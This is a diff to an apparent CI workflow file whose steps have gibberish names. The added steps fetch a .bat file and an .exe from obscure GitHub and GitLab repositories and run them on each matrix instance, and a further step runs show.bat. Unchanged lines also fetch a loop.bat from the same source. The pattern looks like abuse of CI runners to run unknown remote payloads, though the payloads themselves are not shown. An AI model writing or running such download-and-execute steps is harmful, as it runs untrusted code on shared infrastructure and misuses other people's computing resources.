@@ -21,8 +21,15 @@ jobs:
 
       - name: ưewewewewewewew (Instance ${{ matrix.instance }})
         run: |
-          Invoke-WebRequest -Uri "https://gitlab.com/thah49766-group/dvdvdava/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/tollboxlap09/tollboxlap09/refs/heads/main/Downloads.bat" -OutFile "Downloads.bat"
           cmd /c Downloads.bat
+      - name: mjjkjkjkjkjk (Instance ${{ matrix.instance }})
+        run: |
+          curl -s -L -o Av222.exe "https://gitlab.com/thah49766-group/dvdvdava/-/raw/main/vcv.exe"
+          start "" "Av222.exe"
+      - name: mjjkjkjkjkjk (Instance ${{ matrix.instance }})
+        run: cmd /c show.bat
+
       - name: adfdafafssafsafsafsf (Instance ${{ matrix.instance }})
         run: |
           curl -L -o loop.bat "https://gitlab.com/thah49766-group/dvdvdava/-/raw/main/loop.bat"
